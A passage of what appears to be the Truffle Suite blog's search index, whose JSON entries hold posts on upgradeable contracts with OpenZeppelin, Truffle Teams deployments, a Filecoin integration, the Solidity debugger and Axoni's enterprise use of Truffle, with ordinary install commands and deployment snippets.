truffle-upgrades plugin, check out OpenZeppelin\u2019s Truffle documentation . We\u2019re very excited about this plugin and would love to hear more about how you\u2019re using it and how we can make the experience even better! Please let us know how you feel in the Truffler Slack community or on OpenZeppelin\u2019s forum !","title":"A Sweet Upgradeable Contract Experience with OpenZeppelin and Truffle"},{"location":"blog/a-sweet-upgradeable-contract-experience-with-openzeppelin-and-truffle/index.html#the-proxy-pattern","text":"At a high level, the proxy upgrade pattern involves deploying a proxy contract that delegates function calls to your logic and storage contracts. The proxy is storing addresses of the logic contracts and these addresses can be changed. This allows you to deploy a new version of the logic contract and point the proxy to that new version. The proxy contract can point to any number of different logic contracts. There are many concerns around this pattern you\u2019ll need to keep in mind, such as making sure your old contracts cannot be used maliciously. For more information on proxy patterns, check out OpenZeppelin\u2019s proxy pattern guide .","title":"The Proxy Pattern"},{"location":"blog/a-sweet-upgradeable-contract-experience-with-openzeppelin-and-truffle/index.html#using-the-plugin","text":"First, install the package: npm install --save-dev @openzeppelin/truffle-upgrades Note : This package requires Truffle version 5.1.35 or greater. Then, in your migration script, use the new deployProxy and upgradeProxy functions: const { deployProxy , upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const Box = artifacts . require ( 'Box' ); const BoxV2 = artifacts . require ( 'BoxV2' ); module . exports = async function ( deployer ) { const instance = await deployProxy ( Box , [ 42 ], { deployer }); const upgraded = await upgradeProxy ( instance . address , BoxV2 , { deployer }); } Now your contract systems can be much more flexible while still leveraging all of the benefits of a blockchain network. For more information on the truffle-upgrades plugin, check out OpenZeppelin\u2019s Truffle documentation . We\u2019re very excited about this plugin and would love to hear more about how you\u2019re using it and how we can make the experience even better! Please let us know how you feel in the Truffler Slack community or on OpenZeppelin\u2019s forum !","title":"Using the Plugin"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html","text":"TL;DR - Deploying your smart contracts shouldn't be difficult, and the process should be flexible. I give a sneak peek at the next feature we're building: an easy to use interface to deploy your Truffle projects with Truffle Teams ! It's going to be awesome, and you can be the first to use it ! I'll be giving a hands-on workshop from 9AM-12PM on Friday, August 2nd, at TruffleCon 2019 that will walk you through through the entire Truffle Teams lifecycle, including the never-before-used Deployments interface ! See you there! So! You've finished implementing your dApp, you've tested it on Ganache , and you're ready to push it to a testnet or Mainnet! Congratula\u2014oh wait. It's not that easy. There are a handful of solutions, and none have really made it painlessly easy. Even our own truffle migrate (aka truffle deploy ) has left much to be desired. Well it's about to get a whole lot easier with Truffle Teams. Skip to the good stuff. The Not-So-Easy Ways to Deploy Your Smart Contracts \u00b6 So what's wrong with what's already made? Why make yet another tool? I hear you. Let's take a look at what is available, and if you're still meh, I'd love to talk to you at TruffleCon ! Remix Oh Remix , we all have fond memories of you. And many people still use Remix for all sorts of use cases! Remix gives you an in-browser Ethereum IDE, letting you develop, compile, test, debug, and deploy smart contracts for Ethereum. And it's probably the least amount of work needed to throw a single smart contract onto a testnet or Mainnet (i.e. when deploying a single .sol file). Remix, as of version 0.7.7 , gives you a simple Deploy button. This will send a transaction to the web3 provider of your choice (many use MetaMask ), and you're off to the races! Great, right? Well, Remix gets harder to use as you add more contracts, import 3rd party contracts, work as a whole team, etc. It's definitely flexible and able to handle these use cases (though not without legwork and configuration), but it's not my personal preference for developing large, complex dApps. Truffle CLI Enter Truffle . It's a fantastic framework (not to toot our own horns) that lets you develop your dApp in a flexible and extensible way. It provides structure to keep you sane in this chaotic world of Web 3.0. It even gives you a mechanism to define what deploying (aka: \"migrating\") means for your application. You can specify what contracts get deployed in which order with whatever arguments you require. For instance, your smart contracts may depend on the deployment of a past contract, which you can easily code in migration scripts. And it's as easy as running truffle migrate ! ...and if you were deploying directly to Ganache , that'd be entirely true. But that's not the case when we start talking about testnets or Mainnet. The easiest way to deploy to an external network is by using Truffle's HD Wallet Provider . However, this requires you to somehow get your mnemonic or private key into the truffle-config.js config file, without committing it to your provider source control provider (PLEASE don't do this - you'll get your Ether stolen). To use an account you created with MetaMask, you'd need to export your private key from MetaMask (or your mnemonic, if you're feeling lucky \ud83d\ude31) and create the boilerplate code to read in the key from an environment variable (to prevent committing it to your repository and sharing it publicly). In all truthfulness, this isn't too bad, but it's also a bit too much config for me. I'd much rather use MetaMask directly to authenticate transactions during deployments. Custom Management Web Interface \u00b6 Some devs will create a small front-end web interface which uses web3.js to deploy their smart contracts. I have done this personally in my Game of Thrones Death Pool project, and I chalked it up to \"well I can put this on a website and others can deploy their own versions.\" Sometimes this is necessary, but it's more work if it's not absolutely needed for your application. My Version of an Ideal Deployment Interface \u00b6 In an ideal world, I'd like these features in a deployment interface: Lets me use MetaMask directly for signing transactions Remix \u2714\ufe0f | Truffle CLI \u274c | Custom Webapp \u2714\ufe0f A bonus win here is support for Ledger and Trezor wallets! I can use a framework/toolset/etc. that lets me build complex apps and supports complex deployment processes Remix \u274c | Truffle CLI \u2714\ufe0f | Custom Webapp \u2714\ufe0f I don't need to do a lot of work to go from finishing development to deploying Remix \u2714\ufe0f | Truffle CLI \u2714\ufe0f | Custom Webapp \u274c Introducing: Truffle Teams Deployments If you haven't heard about our latest tool, Truffle Teams , you really should check it out. Truffle Teams gives you zero-config Continuous Integration (CI) for your Truffle projects, and it also lets you monitor what's happening with your deployed contracts. Truffle Teams meshes the full Truffle Suite into a cohesive application that enables better collaboration within development teams (even teams of 1!). The next big feature we're working on is Deployments. We already compile your contracts from your Truffle project for you when you make a commit to GitHub; why can't we migrate/deploy them as well? Further, Truffle Teams is a web application, allowing for easy integration with MetaMask . We're looking at this from a DevOps perspective, and we're trying to create an extensible system that will support projects and teams of any size . Connect Your GitHub Repository to Truffle Teams \u00b6 To get started with Truffle Teams, you must first connect your GitHub repository. This is a simple step, and we have instructions on how to do this here . Setup Your Migrations Scripts \u00b6 If you haven't built a Truffle project, you should really give it a try; the Pet Shop Tutorial is a great place to start as it gives a good survey of the different facets of Truffle, including the migration scripts. These scripts let you define the behavior of deploying your smart contracts using a language you're already familiar with. In the tutorial, you deploy a single contract, but it has the flexibility to do so much more (i.e. you can deploy one contract, get its address, and use that in the constructor when deploying another contract). Setting up these scripts is part of the development lifecycle of creating a Truffle project, so I won't cover that here. But that's great! You should already be done with this step!! Commit to GitHub \u00b6 Welp. That was easy. \ud83d\ude05 Monitor the Status of Your Build \u00b6 Head over to https://my.truffleteams.com and click on the BUILDS tab if you're not there already. You can see a build has been queued or has started to process. You can click on the repository name in the card to see more details. You can also get to this page by clicking on the yellow dot in GitHub next to your commit and pressing Details . All Your Tests Pass, Let's Deploy! (but only to a testnet just to be sure) \u00b6 NOTE: This is just a sneak peek of features to come! You won't be able to follow along (yet, but stay tuned !). Great! Your builds are passing, and you're ready to deploy to a testnet (i.e. Ropsten) to see if everything works. Now head over to the DEPLOYMENTS tab and select your repository. You'll now see a screen that shows a list of builds for your commits on the left. Deploying a build is as simple as hovering over the commit, pressing a button, and selecting which network you'd like to deploy to. Truffle Teams will then start the migration/deployment process. Each transaction is sent to the web application and MetaMask will prompt you to confirm transactions. By leveraging MetaMask, we can give you Ledger and Trezor hardware wallet support too! \ud83d\udd12 Happy With a Released Version? Promote it to Production (aka deploy to Mainnet) \u00b6 But we're not done yet! You've finished your testing on Ropsten, and you're now ready to deploy to Mainnet. With the upcoming version of Teams, you can select that deployment and promote it to production (aka Mainnet) with just a couple of clicks. And that's it! Pretty easy if you ask me. \u00b6 \ud83c\udf89 Don't Believe Me? Be The First to Try it at My TruffleCon 2019 Workshop! \ud83c\udf89 \u00b6 I really hope you're going to TruffleCon; it's going to be awesome. Even more so because you can be the first to try Truffle Teams Deployments in my workshop! In my Push It! Push It Real Good: Truffle Teams Intro & Deployments (9AM-12PM on Friday, Aug, 2nd) workshop, we'll cover this entire lifecycle: hooking up your repository, getting your first build to pass, deploying to Ropsten, and finally monitoring transactions made against your contracts (we didn't talk about this here; check out the docs for more details on contract monitoring). Hopefully there will be time for me to answer any questions you have, and maybe even help get your own Truffle project hooked up with Truffle Teams! If not, I will be available during the office hours at 5PM on Friday! I'm also always happy to chat anytime throughout the conference!","title":"An Easier Way to Deploy Your Smart Contracts"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#the-not-so-easy-ways-to-deploy-your-smart-contracts","text":"So what's wrong with what's already made? Why make yet another tool? I hear you. Let's take a look at what is available, and if you're still meh, I'd love to talk to you at TruffleCon !","title":"The Not-So-Easy Ways to Deploy Your Smart Contracts"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#custom-management-web-interface","text":"Some devs will create a small front-end web interface which uses web3.js to deploy their smart contracts. I have done this personally in my Game of Thrones Death Pool project, and I chalked it up to \"well I can put this on a website and others can deploy their own versions.\" Sometimes this is necessary, but it's more work if it's not absolutely needed for your application.","title":"Custom Management Web Interface"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#my-version-of-an-ideal-deployment-interface","text":"In an ideal world, I'd like these features in a deployment interface: Lets me use MetaMask directly for signing transactions Remix \u2714\ufe0f | Truffle CLI \u274c | Custom Webapp \u2714\ufe0f A bonus win here is support for Ledger and Trezor wallets! I can use a framework/toolset/etc. that lets me build complex apps and supports complex deployment processes Remix \u274c | Truffle CLI \u2714\ufe0f | Custom Webapp \u2714\ufe0f I don't need to do a lot of work to go from finishing development to deploying Remix \u2714\ufe0f | Truffle CLI \u2714\ufe0f | Custom Webapp \u274c","title":"My Version of an Ideal Deployment Interface"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#connect-your-github-repository-to-truffle-teams","text":"To get started with Truffle Teams, you must first connect your GitHub repository. This is a simple step, and we have instructions on how to do this here .","title":"Connect Your GitHub Repository to Truffle Teams"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#setup-your-migrations-scripts","text":"If you haven't built a Truffle project, you should really give it a try; the Pet Shop Tutorial is a great place to start as it gives a good survey of the different facets of Truffle, including the migration scripts. These scripts let you define the behavior of deploying your smart contracts using a language you're already familiar with. In the tutorial, you deploy a single contract, but it has the flexibility to do so much more (i.e. you can deploy one contract, get its address, and use that in the constructor when deploying another contract). Setting up these scripts is part of the development lifecycle of creating a Truffle project, so I won't cover that here. But that's great! You should already be done with this step!!","title":"Setup Your Migrations Scripts"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#commit-to-github","text":"Welp. That was easy. \ud83d\ude05","title":"Commit to GitHub"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#monitor-the-status-of-your-build","text":"Head over to https://my.truffleteams.com and click on the BUILDS tab if you're not there already. You can see a build has been queued or has started to process. You can click on the repository name in the card to see more details. You can also get to this page by clicking on the yellow dot in GitHub next to your commit and pressing Details .","title":"Monitor the Status of Your Build"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#all-your-tests-pass-lets-deploy-but-only-to-a-testnet-just-to-be-sure","text":"NOTE: This is just a sneak peek of features to come! You won't be able to follow along (yet, but stay tuned !). Great! Your builds are passing, and you're ready to deploy to a testnet (i.e. Ropsten) to see if everything works. Now head over to the DEPLOYMENTS tab and select your repository. You'll now see a screen that shows a list of builds for your commits on the left. Deploying a build is as simple as hovering over the commit, pressing a button, and selecting which network you'd like to deploy to. Truffle Teams will then start the migration/deployment process. Each transaction is sent to the web application and MetaMask will prompt you to confirm transactions. By leveraging MetaMask, we can give you Ledger and Trezor hardware wallet support too! \ud83d\udd12","title":"All Your Tests Pass, Let's Deploy! (but only to a testnet just to be sure)"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#happy-with-a-released-version-promote-it-to-production-aka-deploy-to-mainnet","text":"But we're not done yet! You've finished your testing on Ropsten, and you're now ready to deploy to Mainnet. With the upcoming version of Teams, you can select that deployment and promote it to production (aka Mainnet) with just a couple of clicks.","title":"Happy With a Released Version? Promote it to Production (aka deploy to Mainnet)"},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#and-thats-it-pretty-easy-if-you-ask-me","text":"","title":"And that's it! Pretty easy if you ask me."},{"location":"blog/an-easier-way-to-deploy-your-smart-contracts/index.html#dont-believe-me-be-the-first-to-try-it-at-my-trufflecon-2019-workshop","text":"I really hope you're going to TruffleCon; it's going to be awesome. Even more so because you can be the first to try Truffle Teams Deployments in my workshop! In my Push It! Push It Real Good: Truffle Teams Intro & Deployments (9AM-12PM on Friday, Aug, 2nd) workshop, we'll cover this entire lifecycle: hooking up your repository, getting your first build to pass, deploying to Ropsten, and finally monitoring transactions made against your contracts (we didn't talk about this here; check out the docs for more details on contract monitoring). Hopefully there will be time for me to answer any questions you have, and maybe even help get your own Truffle project hooked up with Truffle Teams! If not, I will be available during the office hours at 5PM on Friday! I'm also always happy to chat anytime throughout the conference!","title":"\ud83c\udf89 Don't Believe Me? Be The First to Try it at My TruffleCon 2019 Workshop! \ud83c\udf89"},{"location":"blog/announcing-collaboration-with-filecoin/index.html","text":"Today we're announcing an exciting new collaboration, aimed at helping developers across the globe create and deploy fully decentralized applications. We've teamed up with Filecoin to add support for the Filecoin network into our world class suite of tools. In typical Truffle fashion, we'll beef up the Truffle command line tool to give you everything you need to deploy directly to Filecoin; and then we'll add new features to Ganache so that you can easily simulate the Filecoin network during development and testing. The Decentralized Ideal \u00b6 Since Truffle's inception, we've long wanted to integrate with decentralized storage networks so we can help developers build fully decentralized applications. For the most part, this has been a waiting game: Decentralized storage networks have been in heavy development, and it's clear these technologies needed time to mature. With Filecoin's month-long hackathon starting this week , and the launch of their main network (\"mainnet\") coming later this summer, we thought now was the right time to give developers access to this amazing new technology. We're excited about Filecoin because it allows developers to build applications with 100% uptime. For instance, if an application uses only fully-dentralized technologies like Etheruem and Filecoin, the built-in incentivizations of those technologies will ensure miners around the world will keep that application running. With anti-censorship properties, as well as support for large amounts of data, Filecoin support could bring in a new age of Web3. There's a lot we have to do before we reach this ideal, but I'd love to tell you about our roadmap for the next six months. Truffle Preserve: Save Your App Data (available today!) \u00b6 In thinking about our support for Filecoin, the idea of preservation came quickly to mind. We envisioned that preserving application data like Javascript frontends and static assets would be a normal part of the deployment process. So we ran with that idea and added a new command to the Truffle command line tool: truffle preserve . Like preserving fruit, Truffle follows a \"recipe\" to preserve your files. In the gif above, Truffle is using the filecoin recipe, which will ship standard with our new version of Truffle. You can use truffle preserve today! You'll need to download a special release we created so you can start testing, shown below. Note that our Filecoin integration is very alpha, but we wanted to support all the amazing devs hacking on Filecoin this month during HackFS . $ npm install -g truffle@preserves To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin or --ipfs recipes. The filecoin recipe uses the ipfs recipe under the hood. You can choose only the ipfs recipe if you have a different set up! // Preserve to Filecoin: $ truffle preserve . / path / to / directory -- filecoin // Preserve to IPFS only: $ truffle preserve . / path / to / directory -- ipfs By default, truffle preserve comes configured to work with the Powergate localnet , though you can change the IPFS and Filecoin connection information by adding the following to your truffle-config.js file: // ..., environments : { development : { \"ipfs\" : { address : \"http://localhost:5001\" }, \"filecoin\" : { address : \"ws://localhost:7777\" } } }, Note that this configuration adds a new top-level environments object. We'll be using this new configuration object as we upgrade to Truffle 6 in the future. Filecoin-flavored Ganache: Simulate Filecoin (Summer/Fall/Winter) \u00b6 Ganache was built as the sister application to Truffle, to speed up development and testing Ethereum applications. Now that we've added support to Truffle, it's only natural we provide the same highly-modular simulator for Filecoin. Over this summer and into Fall, we plan to create a Filecoin simulation library, as part of ganache-core . Then later on this Fall/Winter, we'll follow that up with support in our graphical version of Ganache, below! Get involved / Reach out! \u00b6 We're extremely excited to be working with the Filecoin team and adding support for Filecoin into Truffle's tooling. If you have questions about our Filecoin integration or our plan for the future, join our slack community and get your questions answered. Whether you're a new dev or a HackFS hacker , we're happy to help.","title":"Announcing Collaboration with Filecoin - Big Integrations Coming"},{"location":"blog/announcing-collaboration-with-filecoin/index.html#the-decentralized-ideal","text":"Since Truffle's inception, we've long wanted to integrate with decentralized storage networks so we can help developers build fully decentralized applications. For the most part, this has been a waiting game: Decentralized storage networks have been in heavy development, and it's clear these technologies needed time to mature. With Filecoin's month-long hackathon starting this week , and the launch of their main network (\"mainnet\") coming later this summer, we thought now was the right time to give developers access to this amazing new technology. We're excited about Filecoin because it allows developers to build applications with 100% uptime. For instance, if an application uses only fully-dentralized technologies like Etheruem and Filecoin, the built-in incentivizations of those technologies will ensure miners around the world will keep that application running. With anti-censorship properties, as well as support for large amounts of data, Filecoin support could bring in a new age of Web3. There's a lot we have to do before we reach this ideal, but I'd love to tell you about our roadmap for the next six months.","title":"The Decentralized Ideal"},{"location":"blog/announcing-collaboration-with-filecoin/index.html#truffle-preserve-save-your-app-data-available-today","text":"In thinking about our support for Filecoin, the idea of preservation came quickly to mind. We envisioned that preserving application data like Javascript frontends and static assets would be a normal part of the deployment process. So we ran with that idea and added a new command to the Truffle command line tool: truffle preserve . Like preserving fruit, Truffle follows a \"recipe\" to preserve your files. In the gif above, Truffle is using the filecoin recipe, which will ship standard with our new version of Truffle. You can use truffle preserve today! You'll need to download a special release we created so you can start testing, shown below. Note that our Filecoin integration is very alpha, but we wanted to support all the amazing devs hacking on Filecoin this month during HackFS . $ npm install -g truffle@preserves To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin or --ipfs recipes. The filecoin recipe uses the ipfs recipe under the hood. You can choose only the ipfs recipe if you have a different set up! // Preserve to Filecoin: $ truffle preserve . / path / to / directory -- filecoin // Preserve to IPFS only: $ truffle preserve . / path / to / directory -- ipfs By default, truffle preserve comes configured to work with the Powergate localnet , though you can change the IPFS and Filecoin connection information by adding the following to your truffle-config.js file: // ..., environments : { development : { \"ipfs\" : { address : \"http://localhost:5001\" }, \"filecoin\" : { address : \"ws://localhost:7777\" } } }, Note that this configuration adds a new top-level environments object. We'll be using this new configuration object as we upgrade to Truffle 6 in the future.","title":"Truffle Preserve: Save Your App Data (available today!)"},{"location":"blog/announcing-collaboration-with-filecoin/index.html#filecoin-flavored-ganache-simulate-filecoin-summerfallwinter","text":"Ganache was built as the sister application to Truffle, to speed up development and testing Ethereum applications. Now that we've added support to Truffle, it's only natural we provide the same highly-modular simulator for Filecoin. Over this summer and into Fall, we plan to create a Filecoin simulation library, as part of ganache-core . Then later on this Fall/Winter, we'll follow that up with support in our graphical version of Ganache, below!","title":"Filecoin-flavored Ganache: Simulate Filecoin (Summer/Fall/Winter)"},{"location":"blog/announcing-collaboration-with-filecoin/index.html#get-involved-reach-out","text":"We're extremely excited to be working with the Filecoin team and adding support for Filecoin into Truffle's tooling. If you have questions about our Filecoin integration or our plan for the future, join our slack community and get your questions answered. Whether you're a new dev or a HackFS hacker , we're happy to help.","title":"Get involved / Reach out!"},{"location":"blog/announcing-full-portable-solidity-debugger/index.html","text":"Every one at Truffle is giddy right now. Since Truffle's inception, it's been our mission to build outstanding development tools for the Ethereum community. The analogy we always used was one of history: Ethereum development practices are years behind the rest of the industry, and it's our job to build tools that modernize our craft. Well today, Truffle's come one step closer to that goal. We're happy to announce the release of our fully featured, fully portable Solidity debugger and debugging libraries . What We've Built \u00b6 If you've followed Truffle development, you're familiar with the truffle debug command. This was the first incarnation of a \"debugger\" built into Truffle, though it wasn't much more than a code tracer. Our new debugger comes with everything you expect : Code stepping (over, into, out, next, instruction, etc.) Current code location, including the address of the running contract Breakpoints Watch expressions Variable inspection (stack, memory and storage) Custom expression evaluation using Solidity variables On top of that, our new debugger is fully portable, built to integrate with any Javascript project or editor, like Visual Studio Code. Lastly, we built it to work with any Ethereum client , so you could debug transactions against the main Ethereum network if you so desired. How it Works \u00b6 To debug your Solidity code, you first need to make a transaction. Ethereum is a world computer with a history of all execution, so we can pull all the information we need from past transactions. After obtaining the transaction hash, simply run the following to kick off your debugging experience: $ truffle debug <tx hash> This will open up the debugging console which you can use to your heart's content! The above user interface gives you access to the debugger features you need to step through your contracts' code, set breakpoints, evaluate expressions and inspect Solidity variables, providing you a better sense of what your code is doing. Under the hood, our debugger is interacting with your Ethereum client to gather all the data necessary to provide this information to you in a suitable manner. For developers reading this, the debugging library stores all this data in Redux, making the data easy to manage and making the library super portable. Most of the work done by the debugger results in some type of mapping. The debugger gathers tons of disparate data, like the bytecode of your contracts, abstract representations of your code, instructions run during your transaction, etc., and combines them to produce information useful to the contract developer. Perhaps the debugger's most valuable property is variable inspection: Using all the data gathered, the debugger can determine which variables exist within your contract, which apply to each section of the code, and what their values are at any point in time. It can even show the values of complex data types, like structs with nested arrays. We're still filling out a few data types, but expect those in the next couple weeks. If you plan on using the debug command today , we recommend using Truffle Develop . Truffle Develop comes with everything you need \"baked in\" to fully debug your contracts. Ganache and ganache-cli will need to be updated, so stay tuned for that in the coming days. Where to Next \u00b6 The debugger we built unlocks tons of value for all Ethereum developers both new and advanced, but what you're seeing here is the tip of the iceberg of where this technology will go. The interface above is just one interface, meant to show off the debugger's capability. As mentioned, the libraries we built are super portable, so they'll end up making their way into all of the following: Integrated Development Environments (IDEs) like Visual Studio Code Ganache , including a full debugging UI Drizzle , for automatic variable change detection after a transaction Browser plugins so you can debug transactions on the fly within your application Ethereum provider libraries that let you debug your code anywhere, without a plugin We encourage the Ethereum community to help build these tools. Our code is open source, and you can find all of it on Github . How to Get It \u00b6 If you already have Truffle installed, simply run the following to get you to the latest version: $ npm uninstall -g truffle $ npm install -g truffle If you're new to Truffle, you can try it out using: $ npm install -g truffle You may have to use sudo with the above commands if you're running Linux. More information about how to use Truffle can be found in our documentation , and feel free to reach out on our community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your question. A Quick Thank You \u00b6 I'd like to personally thank the whole Truffle team for this effort, and particularly Nick D'Andrea for turning some initial research work into a fully portable, fully featured debugger. The engineering under the hood is amazing, I urge you to take a look . I'd also like to thank the community at large: It's a pleasure building the tools that make your lives easier, and your consistent feedback makes the whole endeavor worthwhile. Thanks, -- Tim","title":"Announcing our Fully Featured, Portable Solidity Debugger"},{"location":"blog/announcing-full-portable-solidity-debugger/index.html#what-weve-built","text":"If you've followed Truffle development, you're familiar with the truffle debug command. This was the first incarnation of a \"debugger\" built into Truffle, though it wasn't much more than a code tracer. Our new debugger comes with everything you expect : Code stepping (over, into, out, next, instruction, etc.) Current code location, including the address of the running contract Breakpoints Watch expressions Variable inspection (stack, memory and storage) Custom expression evaluation using Solidity variables On top of that, our new debugger is fully portable, built to integrate with any Javascript project or editor, like Visual Studio Code. Lastly, we built it to work with any Ethereum client , so you could debug transactions against the main Ethereum network if you so desired.","title":"What We've Built"},{"location":"blog/announcing-full-portable-solidity-debugger/index.html#how-it-works","text":"To debug your Solidity code, you first need to make a transaction. Ethereum is a world computer with a history of all execution, so we can pull all the information we need from past transactions. After obtaining the transaction hash, simply run the following to kick off your debugging experience: $ truffle debug <tx hash> This will open up the debugging console which you can use to your heart's content! The above user interface gives you access to the debugger features you need to step through your contracts' code, set breakpoints, evaluate expressions and inspect Solidity variables, providing you a better sense of what your code is doing. Under the hood, our debugger is interacting with your Ethereum client to gather all the data necessary to provide this information to you in a suitable manner. For developers reading this, the debugging library stores all this data in Redux, making the data easy to manage and making the library super portable. Most of the work done by the debugger results in some type of mapping. The debugger gathers tons of disparate data, like the bytecode of your contracts, abstract representations of your code, instructions run during your transaction, etc., and combines them to produce information useful to the contract developer. Perhaps the debugger's most valuable property is variable inspection: Using all the data gathered, the debugger can determine which variables exist within your contract, which apply to each section of the code, and what their values are at any point in time. It can even show the values of complex data types, like structs with nested arrays. We're still filling out a few data types, but expect those in the next couple weeks. If you plan on using the debug command today , we recommend using Truffle Develop . Truffle Develop comes with everything you need \"baked in\" to fully debug your contracts. Ganache and ganache-cli will need to be updated, so stay tuned for that in the coming days.","title":"How it Works"},{"location":"blog/announcing-full-portable-solidity-debugger/index.html#where-to-next","text":"The debugger we built unlocks tons of value for all Ethereum developers both new and advanced, but what you're seeing here is the tip of the iceberg of where this technology will go. The interface above is just one interface, meant to show off the debugger's capability. As mentioned, the libraries we built are super portable, so they'll end up making their way into all of the following: Integrated Development Environments (IDEs) like Visual Studio Code Ganache , including a full debugging UI Drizzle , for automatic variable change detection after a transaction Browser plugins so you can debug transactions on the fly within your application Ethereum provider libraries that let you debug your code anywhere, without a plugin We encourage the Ethereum community to help build these tools. Our code is open source, and you can find all of it on Github .","title":"Where to Next"},{"location":"blog/announcing-full-portable-solidity-debugger/index.html#how-to-get-it","text":"If you already have Truffle installed, simply run the following to get you to the latest version: $ npm uninstall -g truffle $ npm install -g truffle If you're new to Truffle, you can try it out using: $ npm install -g truffle You may have to use sudo with the above commands if you're running Linux. More information about how to use Truffle can be found in our documentation , and feel free to reach out on our community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your question.","title":"How to Get It"},{"location":"blog/announcing-full-portable-solidity-debugger/index.html#a-quick-thank-you","text":"I'd like to personally thank the whole Truffle team for this effort, and particularly Nick D'Andrea for turning some initial research work into a fully portable, fully featured debugger. The engineering under the hood is amazing, I urge you to take a look . I'd also like to thank the community at large: It's a pleasure building the tools that make your lives easier, and your consistent feedback makes the whole endeavor worthwhile. Thanks, -- Tim","title":"A Quick Thank You"},{"location":"blog/axonis-enterprise-use-of-truffle/index.html","text":"Axoni Background \u00b6 At Axoni, our mission is to make shared information more trusted and reliable. We do this through distributed technology that we call \"Ethereum-inspired\", which has both a broad and a specific meaning. In the broad sense, the core technology plays a role for its users analogous to the public blockchain, presenting a powerful and extensible capacity to side-step undesired intermediaries (yes, these exist for banks too...). In a more precise technical sense, our platform borrows certain concepts from Ethereum (e.g. accounts, contracts, gas...) and, importantly, we make efforts to comply with Ethereum-world interfaces (e.g. evm bytecode, web3 JSON-rpc). Of course, an up-shot of the last is the ability to take part in all the innovation taking place in the broader Ethereum ecosystem, including client-side libraries that enable a \"tastier\" application development process. To this end, within the last year we have worked to leverage the Truffle suite and ecosystem to great effect. In fact, as reported , it is fair to say that Truffle serves by and large as the main toolset for on-chain application development at Axoni. Using Truffle at Axoni \u00b6 It was a delight for us to find that, given our compliance with the web3 JSON-RPC spec, truffle basically works \"out-of-the-box\" with no extensive customization required for many very useful stages in the application lifecycle: develop, build, test.... One notable exception: we found the native truffle migrate functionality not extensible to our use case. In part, this is due to the fact that our smart contract applications implement something similar to the proxy pattern , which runs counter to the \"migration\" paradigm. On the other hand, and for reasons beyond the scope of this post, tools such as zoslib designed to handle upgradeable smart contract application deployments, generate smart contract implementations incompatible with our use case. At a high level, our smart contract framework is optimized for high-throughput and highly complex Solidity applications which enables the ability to make automatic upgrades based on semantic versioning. [ Note: I plan to speak more about our particular use cases and smart contract topologies at Trufflecon on August 3rd] In any case, especially due to the often very high levels of complexity entailed by our use cases\u2013 combined with the noted application-level gotcha's of upgrade design patterns in solidity itself \u2013we are biased towards a simple and opinionated declarative format that application and production engineers can easily understand and (when needed) manipulate. This raises the question -- why use truffle for this? It seems there are at least three reasons: truffle-config.js / truffle.js serves as an already existing central source of shared information about various network providers relevant for a particular application developer. It only makes sense to extend this format for use in production-like environments as well. Truffle code artifacts, a battle-tested standard for smart contracts and solidity code, in particular, provide a common interface for a toolchain. By virtue of using truffle, there is no need to re-create this format. For a non-development deployment, a contracts_build_directory parameter is supplied, which results in a pull from a remote artifacts repository. Obviously @truffle/contract itself provides a nice object oriented interface for deploying and performing operations on contracts within this script, thus avoiding any reinventing the wheel within the deployment library itself. Thus, we ventured to build a package on top of truffle that manages configuration-driven smart contract deployments and upgrades. Building a Truffle-Based Deployment Tool \u00b6 The first question is what the configuration file should look like? We determined the \"Straw Man\" to be, simply, a two-dimensional list of job types and associated contracts specified for deployment. Starting with this, we found another concept we needed to add (\"custom-partition\") that is specific to Axcore, relating to the way the node software provisions data across network partitions; certain contracts are provisioned differently from others. In addition to this, we found that the only other concept we needed was a parameter specifying dependencies (\"deps\") that linearizes to a certain order to deployment (which may be necessary, for instance, if a given storage address stores reference to another). For concision, we added limited regex support. In the end, we arrived at a yaml-based file looking very much like the below: version : 0.0.1 setup : partitions : - custom-partition : * - custom-partition : ^public-common contracts : - name : MagmaRegistryFooStorage - name : MagmaRegistryBarStorage deps : - MagmaRegistryFooStorage upgrade : partitions : - custom-partition : \"*\" contracts : - name : MagmaRegistryFoo - name : MagmaRegistryBar In terms of implementation, a truffle exec script reads this configuration file, and for each contract, a) deploys the contract b) performs some basic API configuration and c) installs it in the application through invoking a basic initialization method. The basic top-level run (truffle exec) script looks very much like the below: const run = async ( done ) => { let jobParams = args ; // Configure specific variables for a PROD-like environment: if ( process . env . ENV === 'PROD' ) { jobParams = Object . assign ( args , handleProd ()); } //hoisting injected vars to global scope: global . web3 = web3 ; global . artifacts = artifacts ; // Create instance of job based on type const jobInstance = new Job ( jobParams . job , jobParams ); //Run job by deploying and invoking an initialization method on each contract await jobInstance . run (). catch ( e => done ( e )); done (); }; A command-line client can specify a given job to run, such as the \"upgrade\" job specified above. Given the above configuration, the below command would deploy (if necessary) and initialize \"MagmaRegistryFooStorage\", followed by \"MagmaRegistryBarStorage\" from a given artifacts repository: etna --job upgrade --contracts_build_directory /path/to/artifacts Future Plans and an Announcement \u00b6 I am pleased to announce that we plan to open-source our core Solidity smart contract library, which provides an alternative version of the Proxy pattern, along with this aforementioned deployment tool. We believe both could be useful both for private and public applications and the Axoni team is excited to see what the community builds with these tools. In the meantime, we hope the above at least provides a high-level example of an approach to building lightweight extensions within truffle, and as a simplifying approach to the smart contract deployment process, especially for Proxy Pattern topologies. The Axoni team and I look forward to discussing this topic and much more (such as Axlang, our Scala-based Solidity-alternative ) at Trufflecon.","title":"Axoni's Enterprise Use of Truffle"},{"location":"blog/axonis-enterprise-use-of-truffle/index.html#axoni-background","text":"At Axoni, our mission is to make shared information more trusted and reliable. We do this through distributed technology that we call \"Ethereum-inspired\", which has both a broad and a specific meaning. In the broad sense, the core technology plays a role for its users analogous to the public blockchain, presenting a powerful and 